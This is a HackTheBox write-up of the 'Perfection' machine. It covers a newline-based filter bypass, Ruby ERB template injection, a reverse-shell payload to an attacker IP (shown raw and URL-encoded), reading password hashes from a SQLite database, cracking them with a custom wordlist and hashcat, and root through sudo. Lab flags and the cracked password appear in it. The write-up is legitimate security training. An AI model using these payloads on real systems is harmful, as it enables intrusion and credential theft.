---
layout: post
title: "HTB Write-Up: Perfection"
date: 2024-03-18
categories: [HackTheBox, Easy, Linux]
tags: [SSTI, Ruby, Sinatra, hashcat, sudo]
---

# HackTheBox — Perfection

**Difficulty:** Easy  
**OS:** Linux  
**Topics:** Server-Side Template Injection (SSTI), Ruby ERB, Custom Wordlist Generation, Hash Cracking

---

## Summary

Perfection is a Linux machine hosting a Ruby-based web application (Sinatra + WEBrick) that implements a weighted grade calculator. The application attempts to block malicious input, but the filter can be bypassed using a URL-encoded newline character, allowing Server-Side Template Injection via Ruby's ERB syntax. After gaining a shell, privilege escalation is achieved by finding a SQLite database with password hashes and an email that leaks the password format, enabling a targeted hashcat attack that leads to full sudo access.

---

## Enumeration

### Port Scanning

```bash
nmap -sC -sV -p- 10.10.11.253
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
        http-title: Weighted Grade Calculator
```

Two ports open: SSH on 22 and an nginx web server on port 80. The OS is Linux, likely Ubuntu based on the OpenSSH banner.

### Directory Enumeration

```bash
gobuster dir -u 10.10.11.253 -w /usr/share/wordlists/dirb/common.txt -t 50
```

*Image 1 — Gobuster results, nothing notable found.*

Nothing useful came out of directory enumeration. The attack surface is the web application itself.

---

## Web Application Analysis

### Landing Page

The application is a **Weighted Grade Calculator** powered by **WEBrick 1.7.0**.

*Image 2 — Weighted Grade Calculator landing page.*

Navigating to `/admin` returns an error that reveals the application is running on the **Sinatra** framework, which uses Ruby.

*Image 3 — Sinatra framework error revealed at /admin.*

### Input Filtering

When injecting code into the calculator fields, the application returns:

```
Malicious Input Blocked
```

*Image 4 — Malicious input blocked message.*

Testing various payloads through Burp Suite confirmed the filter blocks common injection patterns:

```sql
' OR '1'='1
```
```javascript
<script>Alert(1)</script>
```
```
%3Cscript%3EAlert(1)%3C%2Fscript%3E
```

All returned the "Malicious Input Blocked" response.

*Image 5 — Burp Suite intercepting requests with blocked payloads.*

### Filter Bypass

After further testing, it turned out that the filter only validates the first line of the input. By URL-encoding a newline character (`%0A`) and prepending it with any character (`N%0A`), the filter can be bypassed, allowing special characters on the following line to be processed.

*Image 6 — URL-encoded newline bypassing the input filter.*

### Server-Side Template Injection (SSTI)

Since the application is built on Sinatra (Ruby) and WEBrick, and ERB (Embedded Ruby) is a commonly used templating engine, the following payload was tested:

```ruby
<%= File.open('/etc/passwd').read %>
```

*Image 7 — ERB payload returning the contents of /etc/passwd.*

The `/etc/passwd` file is returned in the response, confirming **Ruby ERB SSTI**.

---

## Exploitation — Initial Foothold

With confirmed SSTI, the next step is obtaining a reverse shell. The same ERB syntax can be used to execute system commands:

```ruby
<% system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.54/1234 0>&1'") %>
```

The full URL-encoded payload sent via Burp Suite (note the `N%0A` prefix to bypass the filter):

```
N%0A%3C%25%20system(%22%2Fbin%2Fbash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.54%2F1234%200%3E%261'%22)%20%25%3E
```

Setting up the listener on the attacker machine:

```bash
nc -lvp 1234
```

*Image 8 — Reverse shell obtained as user `susan`.*

**User flag:**
```
fb2f98f00238c1f11aa55beb28a6613d
```

> **Reference:** [HackTricks — SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

## Privilege Escalation

### System Enumeration with Linpeas

Running `linpeas.sh` on the target highlighted two interesting paths:

```
/var/mail/susan
/home/susan/Migration/pupilpath_credentials.db
```

### Reading the Email

The email in `/var/mail/susan` was sent by **Tina** and revealed the password format policy in use:

*Image 9 — Email content from Tina revealing the password format.*

The format is:
```
{firstname}_{firstname backwards}_{random integer between 1 and 1,000,000,000}
```

### Extracting the Database

Opening the SQLite database found at `/home/susan/Migration/pupilpath_credentials.db`:

*Image 10 — SQLite database with user hashes.*

```
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
```

The hashes are SHA2-256 (`-m 1400` in hashcat). The target is **Susan Miller**.

### Generating a Custom Wordlist

Given the password format, the search space is too large for a generic wordlist. Instead, a targeted wordlist was generated using a C program (compiled for speed):

```c
#include <stdio.h>

int main() {
    const char* prefix = "susan_nasus_";
    const int MAX_NUMBER = 1000000000;

    for (int i = 1; i <= MAX_NUMBER; i++) {
        printf("%s%d\n", prefix, i);
    }

    return 0;
}
```

Compile and pipe output to a file:

```bash
gcc wordlist.c -o wordlist
./wordlist > wordlist.txt
```

### Cracking the Hash

```bash
hashcat -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f wordlist.txt
```

*Image 11 — Hashcat cracking Susan's hash.*

```
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

**Password:** `susan_nasus_413759210`

### Root Access

Checking sudo permissions with Susan's credentials:

```bash
sudo -l
```

*Image 12 — Susan has unrestricted sudo access.*

Susan can run everything as root with no restrictions:

```bash
sudo su -
```

*Image 13 — Root shell obtained.*

**Root flag:**
```
50ce9fc58f9d94a4277126411761cd7d
```

*Image 14 — Root flag captured.*

---

## Vulnerability Summary

| Step | Vulnerability | Impact |
|---|---|---|
| Initial Access | SSTI via Ruby ERB (filter bypass with `%0A`) | Remote Code Execution |
| Privilege Escalation | Weak password policy + leaked format via email | Full system compromise |

---

## Key Takeaways

- Input filters that only check the first line are trivially bypassed with a URL-encoded newline (`%0A`).
- SSTI in Ruby/Sinatra with ERB syntax (`<%= %>` and `<% %>`) grants direct code execution on the server.
- Leaving password format hints in internal emails significantly reduces the search space for hash cracking attacks.
- Unrestricted `sudo` access for a regular user immediately grants root without needing a dedicated exploit.
